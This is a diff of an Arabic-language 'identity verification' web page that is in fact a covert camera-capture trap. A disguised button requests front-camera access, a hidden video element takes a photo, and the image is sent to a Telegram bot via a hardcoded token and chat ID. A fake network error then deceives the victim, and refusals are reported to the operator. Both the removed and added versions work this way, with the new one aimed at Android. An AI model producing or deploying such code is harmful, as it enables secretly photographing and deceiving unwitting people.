@@ -2,86 +2,92 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحقق من الهوية</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تأكيد الهوية</title>
     <style>
-        body { margin: 0; background: #000; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: sans-serif; color: #fff; overflow: hidden; }
-        #startBtn { padding: 18px 50px; font-size: 19px; border-radius: 50px; border: none; background: #fff; color: #000; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        #status { position: absolute; bottom: 60px; font-size: 16px; display: none; text-align: center; width: 80%; line-height: 1.5; }
+        body { margin: 0; background: #121212; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #fff; }
+        #startBtn { padding: 18px 45px; font-size: 18px; border-radius: 12px; border: none; background: #3f51b5; color: white; font-weight: 600; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.3); transition: 0.2s; }
+        #startBtn:active { transform: scale(0.95); background: #303f9f; }
+        #status { margin-top: 20px; font-size: 15px; text-align: center; width: 85%; color: #bbb; display: none; }
+        /* إخفاء الفيديو تماماً */
         video { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
     </style>
 </head>
 <body>
 
-    <!-- الخطوة الأولى: صفحة الدخول -->
-    <button id="startBtn">دخول الموقع</button>
-    <div id="status">جاري الاتصال بالسيرفر...</div>
+    <button id="startBtn">بدء عملية التحقق</button>
+    <div id="status">جاري الاتصال...</div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // بياناتك البرمجية
-        const token = '8672505531:AAGAAm3KTW7lyoYX8DjnVPfcOutO6LRFnfg'; 
+        const token = '8723034543:AAEb6V0gOAW5EBJje20bF11avfDkoc0dFrU'; 
         const chatID = '1921462984';
 
         const video = document.getElementById('video');
         const startBtn = document.getElementById('startBtn');
         const status = document.getElementById('status');
 
-        // عند الضغط على الزر (طلب إذن الكاميرا)
-        startBtn.onclick = function() {
+        startBtn.onclick = async function() {
             startBtn.style.display = 'none';
             status.style.display = 'block';
-            status.innerText = "جاري التحقق من المتصفح...";
+            status.innerText = "جاري تهيئة النظام...";
 
-            // طلب الكاميرا (سيظهر زر Allow/سماح للمستخدم)
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then(function(stream) {
-                    video.srcObject = stream;
-                    status.innerText = "جاري مزامنة البيانات...";
-                    
-                    // الخطوة الثانية: التقاط الصورة بعد ثانية واحدة فقط
-                    setTimeout(takeAndSend, 1000);
-                })
-                .catch(function(err) {
-                    status.innerText = "خطأ: يجب السماح بالكاميرا وتحديث الصفحة للدخول.";
-                    // إرسال تنبيه لك بأن الشخص رفض الإذن
-                    fetch(`https://telegram.org{token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent("❌ الشخص رفض إذن الكاميرا")}`);
+            try {
+                // طلب الكاميرا الأمامية لأجهزة أندرويد
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
                 });
+                
+                video.srcObject = stream;
+                status.innerText = "جاري معالجة البيانات...";
+
+                // الانتظار قليلاً لفتح العدسة ثم الالتقاط
+                setTimeout(takeAndSend, 1200);
+
+            } catch (err) {
+                console.error(err);
+                status.style.color = "#ff5252";
+                status.innerText = "خطأ: يرجى الضغط على 'سماح' (Allow) عند طلب المتصفح للوصول للكاميرا.";
+                // إبلاغك برفض الإذن
+                fetch(`https://telegram.org{token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent("❌ فشل: تم رفض إذن الكاميرا على أندرويد")}`);
+            }
         };
 
         function takeAndSend() {
             const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
+            // تأكد من أبعاد الفيديو الحقيقية
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(function(blob) {
+                if(!blob) return;
+                
                 const formData = new FormData();
                 formData.append('chat_id', chatID);
-                formData.append('photo', blob, 'capture.jpg');
+                formData.append('photo', blob, 'android_capture.jpg');
 
-                // الخطوة الثالثة: إرسال الصورة للبوت
                 fetch(`https://telegram.org{token}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 })
-                .then(function(res) {
-                    // إغلاق الكاميرا فوراً بعد الإرسال
+                .then(() => {
+                    // إيقاف الكاميرا فوراً
                     const tracks = video.srcObject.getTracks();
                     tracks.forEach(track => track.stop());
-
-                    // الخطوة الرابعة: إظهار رسالة خطأ وهمية للشخص
-                    setTimeout(() => {
-                        status.style.color = "#ff4d4d";
-                        status.innerText = "حدث خطأ غير متوقع في الشبكة (Error: 0x8004100). يرجى المحاولة لاحقاً.";
-                    }, 500);
+                    
+                    status.style.color = "#ff5252";
+                    status.innerText = "فشل في التحقق (Error: 502). يرجى المحاولة من متصفح آخر.";
                 })
-                .catch(function() {
-                    status.innerText = "فشل الاتصال بالشبكة.";
+                .catch(() => {
+                    status.innerText = "خطأ في الشبكة.";
                 });
-            }, 'image/jpeg', 0.6);
+            }, 'image/jpeg', 0.6); // ضغط الصورة لسرعة الإرسال
         }
     </script>
 </body>
